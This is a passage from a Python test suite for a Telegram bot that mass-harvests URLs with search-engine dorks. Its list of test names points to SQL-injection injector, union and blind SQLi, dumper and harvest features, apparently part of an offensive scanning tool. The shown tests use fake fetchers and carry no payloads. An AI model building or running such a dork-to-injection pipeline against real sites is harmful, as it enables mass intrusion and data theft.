        with open(empty_p, encoding="utf-8") as f:
            eq(json.load(f).get("bot_token"), "123456:AAHgood_token_here",
               "empty config repaired")
        with open(good_p, encoding="utf-8") as f:
            eq(json.load(f).get("bot_token"), "123456:AAHgood_token_here",
               "source config intact")

        ok(core.is_admin(8937044612), "owner hamesha admin")
        ok(not core.is_admin(123), "unknown not admin")
    finally:
        core._config_paths = old_paths
        core._CONFIG.clear()
        core._CONFIG.update(old_cfg)
        core.BOT_TOKEN = old_tok
        shutil.rmtree(tmp, ignore_errors=True)

def test_v2140_no_dork_left():
    """v2.14.0 — har dork ki asli request, jhoothi 10000/10000 nahi."""
    group("v2.14.0 dork coverage")
    src = open(os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "bot.py"), encoding="utf-8").read()
    contains(src, "YIELD MODE")
    contains(src, "Not attempted:")
    contains(src, "Yield:")
    for bit in ("_again", "_ready_list", "_REST_FOR", "engine_rest",
                "url_goal", "yield_target", "goal_hit", "avg_req"):
        contains(src, bit)

    import asyncio as _aio
    old_fetch = core.fetch_engine
    old_rest = core.sget("engine_rest", 90)
    old_budget = core.sget("parse_budget", 3600)
    old_pages = core.sget("parse_pages", 2)
    old_settings = dict(core.SETTINGS)
    calls = {"n": 0}

    async def fake_fetch(session, engine, dork, proxy=None, timeout=15.0,
                         page=0, rot=None, miss=None):
        calls["n"] += 1
        if calls["n"] % 7 == 0:                 # kuchh block, kuchh result
            core.ENGINE_LAST[engine] = ("blocked page (captcha/challenge)", 0)
            core.engine_miss_add(engine, miss)
            return []
        return ["https://ex.com/%s/%d" % (engine, abs(hash(dork)) % 99999)]

    try:
        core.fetch_engine = fake_fetch
        extra = {k: getattr(core, k, None) for k in ("gj_enabled", "gj_alive")}
        core.gj_enabled = lambda: False                  # test me network nahi
        core.gj_alive = lambda: True
        core.SETTINGS["engine_rest"] = 0.2
        core.SETTINGS["parse_pages"] = 1
        dorks = ["inurl:test%d" % i for i in range(40)]
        res = _aio.run(core.parse_deep(dorks, max_urls=100000, use_proxy=False,
                                       mode="fast", budget=60))
        st = res["stats"]
        eq(st["scanned"], 40, "har dork attempt hua")
        eq(st["skipped"], 0, "koi dork nahi chhoota")
        ok(st["attempts"] >= 40, "requests >= dorks (%s)" % st["attempts"])
        eq(st["total"], 40, "total")
        ok(st.get("remaining_dorks") == [], "CONTINUE ke liye kuchh bacha nahi")
        ok(st["unique"] > 0, "urls mile")

        # ab poora block — scan jhooth na bole
        async def dead_fetch(session, engine, dork, proxy=None, timeout=15.0,
                             page=0, rot=None, miss=None):
            calls["n"] += 1
            core.ENGINE_LAST[engine] = ("blocked page (captcha/challenge)", 0)
            core.engine_miss_add(engine, miss)
            await _aio.sleep(0.05)
            return []

        core.fetch_engine = dead_fetch
        res2 = _aio.run(core.parse_deep(["inurl:dead%d" % i for i in range(400)],
                                        max_urls=1000, use_proxy=False,
                                        mode="fast", budget=1.2))
        st2 = res2["stats"]
        ok(st2["scanned"] < st2["total"], "blocked me jhoothi 100%% nahi")
        ok(st2["skipped"] > 0, "baaki dorks skipped gine")
        ok(len(st2.get("remaining_dorks") or []) > 0, "CONTINUE possible")
    finally:
        core.fetch_engine = old_fetch
        for _k, _v in extra.items():
            if _v is not None:
                setattr(core, _k, _v)
        core.SETTINGS.clear()
        core.SETTINGS.update(old_settings)
        core.SETTINGS["engine_rest"] = old_rest
        core.SETTINGS["parse_budget"] = old_budget
        core.SETTINGS["parse_pages"] = old_pages

def test_v2150_yield_mode():
    """v2.15.0 — dorks ka Nx URLs: 1 request par nahi rukta, target tak jata hai."""
    group("v2.15.0 yield mode")
    src = open(os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "bot.py"), encoding="utf-8").read()
    for bit in ("YIELD MODE", "_one_request", "_max_req", "URL TARGET",
                "Sources/dork", "Target reached"):
        contains(src, bit)

    import asyncio as _aio
    import random as _random
    old_fetch = core.fetch_engine
    old_gj_on, old_gj_live = core.gj_enabled, core.gj_alive
    old_settings = dict(core.SETTINGS)
    pool = ["https://s%d.example.com/p%d?id=%d" % (i % 300, i % 9, i) for i in range(4000)]

    async def fake_fetch(session, engine, dork, proxy=None, timeout=15.0,
                         page=0, rot=None, miss=None):
        _random.seed(abs(hash((engine, dork, page))) % 10 ** 6)
        return _random.sample(pool, 10)          # 10 results, heavy overlap

    try:
        core.fetch_engine = fake_fetch
        core.gj_enabled = lambda: False
        core.gj_alive = lambda: True
        core.SETTINGS["engine_rest"] = 1
        core.SETTINGS["parse_pages"] = 3
        core.SETTINGS["yield_target"] = 10       # 10x maango
        dorks = ["inurl:y%d" % i for i in range(200)]
        res = _aio.run(core.parse_deep(dorks, max_urls=200000, pages=3,
                                       use_proxy=False, mode="fast", budget=120))
        st = res["stats"]
        eq(st["url_goal"], 2000, "target = dorks x 10")
        ok(st["unique"] >= 1200, "yield >= 6x (%d URLs)" % st["unique"])
        ok(st["avg_req"] > 1.3, "ek request par nahi ruka (%.1f/dork)" % st["avg_req"])
        ok(st["attempts"] > st["total"], "requests > dorks")
        eq(st["skipped"], 0, "koi dork nahi chhoota")
        eq(st["remaining_dorks"], [], "target/pass ke baad kuch bacha nahi")

        # saturation — pool khatam ho to jhoothi mehnat band
        old_pool = list(pool)
        core.SETTINGS["yield_target"] = 20
        res_sat = _aio.run(core.parse_deep(["inurl:s%d" % i for i in range(600)],
                                           max_urls=200000, pages=3, use_proxy=False,
                                           mode="fast", budget=120))
        st_sat = res_sat["stats"]
        ok(st_sat["saturated"] == 1, "saturation detect")
        ok(st_sat["attempts"] < 600 * 9, "saturated par request band (%d)" % st_sat["attempts"])
        eq(st_sat["remaining_dorks"], [], "saturated → CONTINUE nahi")
        ok(st_sat["unique"] > 0, "urls mile")
        pool[:] = old_pool

        # 3x target → kam requests me pura
        core.SETTINGS["yield_target"] = 3
        res2 = _aio.run(core.parse_deep(["inurl:z%d" % i for i in range(120)],
                                        max_urls=200000, pages=3, use_proxy=False,
                                        mode="fast", budget=120))
        st2 = res2["stats"]
        eq(st2["url_goal"], 360, "3x target")
        ok(st2["unique"] >= 360 or st2["goal_hit"], "3x target reach")
        ok(st2["attempts"] < st["attempts"] * 2, "kam mehnat me 3x")
    finally:
        core.fetch_engine = old_fetch
        core.gj_enabled, core.gj_alive = old_gj_on, old_gj_live
        core.SETTINGS.clear()
        core.SETTINGS.update(old_settings)


def main():
    for fn in (test_meta, test_theme_helpers, test_await_helpers, test_detect_kind,
               test_kind_check_numeric, test_pro_engine, test_universal,
               test_keywords, test_serp_providers, test_apis_text, test_commands,
               test_setkey_variants, test_flows, test_feature_gate,
               test_niche_country, test_qa, test_help_uses_fonts,
               test_reader_formats, test_kw_slug, test_engines, test_crawler,
               test_file_in_flow, test_pending_file, test_enginetest,
               test_single_file, test_diagnostics, test_batch,
               test_parse_everything, test_v28_tools, test_v29_parser,
               test_v29_payloads, test_v29_keywords, test_ui_is_english,
               test_proxy_hidden_from_users, test_rotating_proxy,
               test_dns_helpers, test_rot_test_card, test_injector_engine,
               test_dumper_engine, test_injector_live,
               test_injector_flow, test_dumper_flow, test_harvest_flow,
               test_sqli_engine, test_sqli_live_union, test_sqli_live_blind,
               test_large_data_guard, test_large_guard_card,
               test_silent_kill_guard, test_injector_small_matrix, test_keywords_variety,
               test_parser_settings, test_paste_smart_fallback,
               test_no_dead_buttons, test_build_stamp,
               test_config_persistence, test_menu_emoji,
               test_premium_emoji, test_v211_bugfixes,
               test_v212_engines, test_v2122_bing_quality,
               test_v2130_token_repair, test_v2131_update_proof,
               test_v2140_no_dork_left, test_v2150_yield_mode):
        try:
            fn()
        except Exception as exc:
            FAIL.append("%s → EXCEPTION %s: %s" % (CUR[0], type(exc).__name__, exc))
            import traceback
            traceback.print_exc()
    total = PASS + len(FAIL)
    print("\n" + "=" * 60)
    if FAIL:
        print("❌ FAILED %d / %d" % (len(FAIL), total))
        for f in FAIL:
            print("   •", f)
        print("=" * 60)
        return 1
    print("✅ ALL PASS — %d / %d" % (PASS, total))
    print("=" * 60)
    return 0


if __name__ == "__main__":
    sys.exit(main())
